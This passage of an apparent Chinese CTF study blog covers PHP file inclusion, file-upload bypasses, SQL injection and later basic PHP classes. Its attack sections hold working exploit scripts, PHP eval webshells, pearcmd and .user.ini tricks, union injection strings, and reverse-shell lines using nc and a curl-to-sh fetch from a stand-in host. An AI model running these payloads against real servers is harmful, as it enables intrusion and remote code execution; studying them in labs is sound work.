class="function">        <span class="title">pass</span></span></span><br><span class="line"><span class="function">    <span class="title">except</span> <span class="title">ValueError</span>, <span class="title">e</span>:</span></span><br><span class="line"><span class="function">        <span class="title">print</span> &quot;<span class="title">Error</span> <span class="title">with</span> <span class="title">poolsz</span> %<span class="title">d</span>: %<span class="title">s</span>&quot; % (<span class="params">sys.argv[<span class="number">3</span>], e</span>)</span></span><br><span class="line"><span class="function">        <span class="title">sys</span>.<span class="title">exit</span>(<span class="params"><span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">print</span> &quot;<span class="title">Getting</span> <span class="title">initial</span> <span class="title">offset</span>...&quot;,  </span></span><br><span class="line"><span class="function">    <span class="title">reqphp</span>, <span class="title">tag</span>, <span class="title">reqlfi</span> = <span class="title">setup</span>(<span class="params">host, port</span>)</span></span><br><span class="line"><span class="function">    <span class="title">offset</span> = <span class="title">getOffset</span>(<span class="params">host, port, reqphp</span>)</span></span><br><span class="line"><span class="function">    <span class="title">sys</span>.<span class="title">stdout</span>.<span class="title">flush</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">maxattempts</span> = 1000</span></span><br><span class="line"><span class="function">    <span class="title">e</span> = <span class="title">threading</span>.<span class="title">Event</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">l</span> = <span class="title">threading</span>.<span class="title">Lock</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">print</span> &quot;<span class="title">Spawning</span> <span class="title">worker</span> <span class="title">pool</span> (<span class="params">%d</span>)...&quot; % <span class="title">poolsz</span></span></span><br><span class="line"><span class="function">    <span class="title">sys</span>.<span class="title">stdout</span>.<span class="title">flush</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">tp</span> = []</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span>(<span class="params"><span class="number">0</span>,poolsz</span>):</span></span><br><span class="line"><span class="function">        <span class="title">tp</span>.<span class="title">append</span>(<span class="params">ThreadWorker(<span class="params">e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag</span>)</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">t</span> <span class="title">in</span> <span class="title">tp</span>:</span></span><br><span class="line"><span class="function">        <span class="title">t</span>.<span class="title">start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">try</span>:</span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">e</span>.<span class="title">wait</span>(<span class="params"><span class="number">1</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">if</span> <span class="title">e</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                <span class="title">break</span></span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">l</span>:</span></span><br><span class="line"><span class="function">                <span class="title">sys</span>.<span class="title">stdout</span>.<span class="title">write</span>(<span class="params"> <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (<span class="params">counter, maxattempts</span>)</span>)</span></span><br><span class="line"><span class="function">                <span class="title">sys</span>.<span class="title">stdout</span>.<span class="title">flush</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">        <span class="title">print</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">e</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">print</span> &quot;<span class="title">Woot</span>!  \<span class="title">m</span>/&quot;</span></span><br><span class="line"><span class="function">        <span class="title">else</span>:</span></span><br><span class="line"><span class="function">            <span class="title">print</span> &quot;:(<span class="params"><span class="string">&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">    except KeyboardInterrupt:</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">        print &quot;</span>\nTelling threads to shutdown...<span class="string">&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">        e.set()</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">    </span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">    print &quot;</span>Shuttin<span class="string">&#x27; down...&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">    for t in tp:</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">        t.join()</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function"></span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">if __name__==&quot;__main__&quot;:</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">    main()</span></span></span></span><br></pre></td></tr></table></figure>
<h3 id="session文件包含（upload-progress文件上传）">session文件包含（upload_progress文件上传）</h3>
<p>php的session也可以保留我们的恶意代码，只要能找到sess文件的</p>
<p>要有一个包含点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">session=requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">sess=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&quot;</span> <span class="comment">#靶场地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data1=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php echo &quot;success&quot;;file_put_contents(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write</span>():</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">                r = session.<span class="title function_ invoke__">post</span>(url,data=data1,files=file,cookies=cookies)</span><br><span class="line">def <span class="title function_ invoke__">read</span>():</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">                r = session.<span class="title function_ invoke__">get</span>(url+<span class="string">&quot;?file=../../../../../../../tmp/sess_ctfshow&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> in r.text:</span><br><span class="line">                        <span class="keyword">print</span>(<span class="string">&quot;shell 地址为：&quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">                        <span class="keyword">exit</span>()</span><br><span class="line">                        </span><br><span class="line">threads = [threading.<span class="title function_ invoke__">Thread</span>(target=write),</span><br><span class="line">       threading.<span class="title function_ invoke__">Thread</span>(target=read)]</span><br><span class="line"><span class="keyword">for</span> t in threads:</span><br><span class="line">        t.<span class="title function_ invoke__">start</span>()</span><br></pre></td></tr></table></figure>
<h1>用脚本的题</h1>
<h3 id="pear文件包含">pear文件包含</h3>
<h4 id="姿势1">姿势1</h4>
<p>本地新建一个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sheell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php system(\$_POST);&quot;</span>;</span><br><span class="line"><span class="comment">//\用来转义</span></span><br></pre></td></tr></table></figure>
<p>直接远程下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ab173.com/net/ip2int.php</span><br></pre></td></tr></table></figure>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007005014418.png" alt="image-20221007005014418"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/PEAR/pearcmd.php&amp;ctfshow+install+R+/var/www/html/+htttps://靶场/x.php</span><br></pre></td></tr></table></figure>
<p>+R+/<em>下载的目录</em>/</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007010945121.png" alt="image-20221007010945121"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/PEAR/pearcmd.php&amp;aaaa+config+create+/var/www/html/&lt;?=&#x27;$_POST[1]&#x27;;?&gt;+xxx.php</span><br></pre></td></tr></table></figure>
<p>1=whoami</p>
<p>1=ls /</p>
<h3 id="远程文件包含">远程文件包含</h3>
<p>ip转int可以直接绕过’.’</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007011207040.png" alt="image-20221007011207040"></p>
<p>在日志里进行污染</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007011253346.png" alt="image-20221007011253346"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007011407010.png" alt="image-20221007011407010"></p>
<p>在body进行传参</p>
<h1>6文件上传</h1>
<h2 id="php文件上传机制">php文件上传机制</h2>
<h2 id="文件上传的例子">文件上传的例子</h2>
<h3 id="文件上传表单">文件上传表单</h3>
<h3 id="文件上传的例子-2">文件上传的例子</h3>
<h3 id="文件上传的成因">文件上传的成因</h3>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008195526042.png" alt="image-20221008195526042"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008195606195.png" alt="image-20221008195606195"></p>
<h2 id="文件上传中可能存在">文件上传中可能存在</h2>
<h3 id="文件后缀黑名单过滤">文件后缀黑名单过滤</h3>
<p>如果出现php3个字符,我们可以双写绕过，phphpp</p>
<p>还有情况是，如果单纯对php后缀进行过滤，但是某些配置文件为了兼容老版本的php代码，也会增加对其他后缀的解析支持。比如php3.php5甚至phtml</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008200647838.png" alt="image-20221008200647838"></p>
<h3 id="php文件上传的00截断">php文件上传的00截断</h3>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008200901547.png" alt="image-20221008200901547"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008200932371.png" alt="image-20221008200932371"></p>
<p>GIF89a</p>
<?=
eval($_POST['cmd']);
?>
<h3 id="iconv字符转换异常造成截断">iconv字符转换异常造成截断</h3>
<p>php在文件上传场景下的文件名字字符集转换时，可能会出现截断绕过。</p>
<p>其中iconv喊出通常用来进行字符集转换，在utf=<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008201120661.png" alt="image-20221008201120661"></p>
<h3 id="文件后缀白名单过滤">文件后缀白名单过滤</h3>
<p>白名单校验文件后缀比黑名单校验更安全。普遍，绕过白名单通常需要借助web服务器</p>
<h4 id="1web服务器漏洞过滤">1web服务器漏洞过滤</h4>
<h4 id="IIS解析漏洞">IIS解析漏洞</h4>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008201450064.png" alt="image-20221008201450064"></p>
<h4 id="Nginx解析漏洞">Nginx解析漏洞</h4>
<p>在Nginx解析php的配置中，如果配置中未设置try_files且PHP-FPM未设置security。limit_extension，可能出现解析漏洞</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008201555956.png" alt="image-20221008201555956"></p>
<p>解析漏洞在后面加/aa.php以php格式解析（url会误认为是php格式），就可以进行操作</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008202016981.png" alt="image-20221008202016981"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008202025261.png" alt="image-20221008202025261"></p>
<h3 id="Apache解析漏洞">Apache解析漏洞</h3>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221008202539870.png" alt="image-20221008202539870"></p>
<h2 id="文件上传的高级利用">文件上传的高级利用</h2>
<h3 id="配置文件过滤">配置文件过滤</h3>
<h3 id="user-ini配置文件48t">.user.ini配置文件48t</h3>
<p>auto_append_file=xxxx.txt</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009002806797.png" alt="image-20221009002806797"></p>
<h3 id="为什么使用-use-ini自动附加文件时，当前目录必须要有php文件？">为什么使用.use.ini自动附加文件时，当前目录必须要有php文件？</h3>
<p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，看看什么意思：</p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">01</span>.gif</span><br></pre></td></tr></table></figure>
<p>01.gif是要包含的文件。</p>
<h3 id="要追加时要有一个php文件，才能利用">要追加时要有一个php文件，才能利用</h3>
<p>像&lt;?php,system.eval,$_GET,$_POST被禁用，我们可以使用cookie上传数据，或者用sell_exec反弹shell</p>
<p>用cookie传输数据</p>
<?$_COOKIE[1];文件上传，

![image-20221009110407090](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009110407090.png)

### 反弹shell

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`nc ip port-e/bin/sh`;</span><br><span class="line"><span class="meta">&lt;?=</span>`curl https:<span class="comment">//your-shell.com/ip:port |sh`&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>&gt;<span class="number">1</span>.php</span><br><span class="line">    <span class="comment">//如果发不出去选中双引号之内的东西base编码</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>&gt;<span class="number">1</span>.php</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>|base64 -d &gt;<span class="number">1</span>.php</span><br><span class="line">    <span class="comment">//要将它转交给base64,空格-d代表解码</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>|base64 -d &gt;<span class="number">1</span>.php    <span class="comment">//把他复制到value里</span></span><br><span class="line">也可以把+编码成%<span class="number">2</span>b即：</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;</span>|base64 -d &gt;<span class="number">1</span>.php    </span><br></pre></td></tr></table></figure>

然后POST

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=ming&#x27;zhi</span><br></pre></td></tr></table></figure>

也可以用

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

### 文件上传与xss

利用oss对象存储桶来实现xss

利用配置文件来xss

图片上传

getimagesize

![image-20221009144246841](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009144246841.png)

![image-20221009144331535](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009144331535.png)

![image-20221009144343117](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009144343117.png)

![image-20221009144743043](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009144743043.png)



### png二次渲染绕过

直接生成一个新图片，清洗掉原来的php文件

连接已重置说明图片太大列

49t需要脚本

![image-20221009153719266](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221009153719266.png)

## 总结

文件上传最容易出现代码执行和命令执行，且危害巨大，

配置文件.user.ini中，auto_append_file参数不仅可以写文件名，还能写伪协议和日志

getimagesise函数可以通过#define width 100来绕过

png和jpg的二次渲染后，仍有可能保留恶意代码



# 7SQL注入

## SQL的基本 语法

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CURD</span><br><span class="line">Creat</span><br><span class="line">Delete</span><br><span class="line">Update</span><br><span class="line">Read</span><br></pre></td></tr></table></figure>

### sql语言的作用

sql是一门语言，专门用来操作数据库中的数据。通过sql语句，我们可以快速的实现数据交互，修改，检查。

### 数据库

数据是一种软件。他负责将数据以一定的格式保存在磁盘中，方便人们进行数据操作

数据库可以分为：

#### 关系型数据库

代表软件：

- Oracle
- Mysql
- SqlServer
- 微软数据库，在Windows操作系统中广泛使用
- Access

#### 非关系型数据库

也叫NoSQL,泛指非关系型的数据库，为了解决大规模数据集合多重数据种类带来的挑战

代表：

- M
- 

<br>换行

### sql语句

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select id,password,username <span class="keyword">from</span> user;</span><br><span class="line">update page set title = <span class="string">&#x27;page1&#x27;</span>,content=<span class="string">&#x27;content1&#x27;</span> where id = <span class="number">1</span>;</span><br><span class="line">delect <span class="keyword">from</span> page where id=<span class="number">1</span>;</span><br><span class="line">insert into <span class="title function_ invoke__">page</span> (title,content) <span class="title function_ invoke__">values</span>(<span class="string">&#x27;page1&#x27;</span>,<span class="string">&#x27;content1&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>()</span><br><span class="line"><span class="comment">//打开到一个MYSQL服务器连接</span></span><br><span class="line">conn-&gt;<span class="title function_ invoke__">query</span>()</span><br><span class="line"><span class="comment">//将sql语句传入数据库，进行交互，</span></span><br><span class="line">conn-&gt;<span class="title function_ invoke__">fetch_all</span>()</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">conn-&gt;<span class="title function_ invoke__">fetch_array</span>()</span><br><span class="line"><span class="comment">//拿到查询的数据，只拿一行</span></span><br></pre></td></tr></table></figure>

## sql注入

### sql注入的产生

动态页面，通过get或者post提交参数，这个参数进入到sql语句进行数据库查询，如果对浏览器发送的get或者post参数，拼接进sql语句之前，没有进行过滤，就会造成sql注入漏洞

![image-20221007165426212](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007165426212.png)

### sql注入的危害1' and 1=2 union select 1,2,3,skctf_flag from fl4g#

歪曲sql语句的查询结果，

泄露数据库中的敏感数据，

干扰查询结果绕过权限检查，

通过文件操作写入恶意代码，

#### 数字注入和union注入

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 1,2,3</span><br><span class="line">id=1 union select 1,2,3 //limit 1,1</span><br><span class="line">id=1 select1,(select),3 limit 1,1</span><br><span class="line">id=1 union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3 limit 1,1</span><br><span class="line">&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

#### 字符型注入  

#### 布尔盲注

当我们没有明显的回显点。只能得到两种结果，比如页面报错，页面没报错，这时候我们就可以使用布尔盲注来猜

#### 报错注入

![image-20221007192714064](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007192714064.png)

# 2.11.10

update xml报错

floor报错

整数溢出报错

exp报错

pow报错

![image-20221007193146697](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007193146697.png)

cot报错

![image-20221007193241589](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221007193241589.png)

### 堆叠注入

# 8.php基础，类与对象  

## php中的面向对象

### 面向对象的思想：

![image-20221010123905091](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010123905091.png)

### php面向对象的特点

#### 聚类

如执行命令：更改一个被全部更改

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">shell_exec</span><br><span class="line">exec</span><br><span class="line">passthru</span><br><span class="line">popen</span><br></pre></td></tr></table></figure>

#### 封装

![image-20221010124401975](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010124401975.png)

#### 隔离

![image-20221010124559418](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010124559418.png)

例如

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#创建一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;sdfsdfa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1111</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(); <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);<span class="comment">//序列化对象</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);<span class="comment">//输出序列化后的结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

通过`new`关键字实例化一个类，从类名生产出一个具体的实例

我们可以给实例属性进行赋值，比如：

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span>-&gt;a=<span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

同样的类实例出来的不同对象

不同对象之间的属性值是隔离的，互相不能访问

在对象内部也不能访问外部的变量

![image-20221010125053847](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010125053847.png)

之间输出$name肯定空白

这里的$name就成为为初始化的变量了，在类内部无法直接调用外部的变量，也不能直接调用其他类的非静态变量，这样就起到了隔离的作用

![image-20221010125326488](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010125326488.png)

#### 继承

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HUman</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">speak_chinese</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

#### 多态

在php中是弱类型，在参数传递过程中，可以改变参数的对象类型，作为对象依然是可以传递进去的，当同一个参数由不同的对象实例来传递，那么调用结果就实现不同的状态。

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

![image-20221010153749819](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010153749819.png)

面向对象的三个特征

封装，继承，多态

## 类与对象

在php中类的属性和方法权限有3个权限，分别为

public

protected

private

### public权限

![image-20221010153821573](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010153821573.png)

### protected权限

![image-20221010154057881](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010154057881.png)

这里Human就是Animal的子类

Animal是Human的父类

其次。子类不能调用父类的私有方法，属性

子类可以访问父类的静态方法

## 类的属性

![image-20221010154345908](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010154345908.png)

### 静态属性

### final属性

子类中可以重写父类

![image-20221010155532091](https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221010155532091.png)

## 类的分类

### 抽象类

使用`abstract`关键字定义抽象类

**定义为抽象的类不能实例化**

